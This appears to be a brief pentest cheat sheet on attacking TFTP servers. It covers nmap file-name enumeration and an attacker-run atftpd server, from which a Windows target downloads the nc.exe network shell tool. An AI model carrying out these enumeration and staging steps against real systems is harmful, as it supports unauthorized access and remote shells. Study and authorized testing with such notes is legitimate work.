# TFTP uses UDP port 69 ad requires no authentication. Generally TFTP servers are
# exploited by performing the following actions:
# - obtaining files/content from the server
# - overwrite data on the server
# - execute code via an overflow exploit

# We can run an nmap script against an available server to execute a dictionary
# attack to guess file names on the server, metasploit has a similar brute-force
# module.
nmap -Pn -sU -p69 --script tftp-enum <target-ip>

# Connect to a tftp target
# We will have FTP like commands such as `put` and `get`.
tftp <target-ip>


## Transfer Files through TFTP
On the attacker machine:
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/

On Target:
EX. FROM WINDOWS HOST:
C:\Users\Offsec>tftp -i $ip get nc.exe
